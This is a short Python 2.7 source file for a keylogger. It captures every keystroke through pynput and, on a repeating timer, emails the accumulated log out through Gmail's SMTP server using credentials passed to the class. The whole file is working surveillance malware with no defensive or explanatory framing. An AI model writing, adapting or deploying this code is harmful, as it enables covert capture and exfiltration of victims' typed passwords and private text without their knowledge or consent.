#! usr/bin/env python
# use python 2.7
import smtplib
import pynput.keyboard
import threading


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started..."
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_keystroke(self, key):
        try:
            current_key = str(key.char)
            self.append_to_log(current_key)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystroke)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
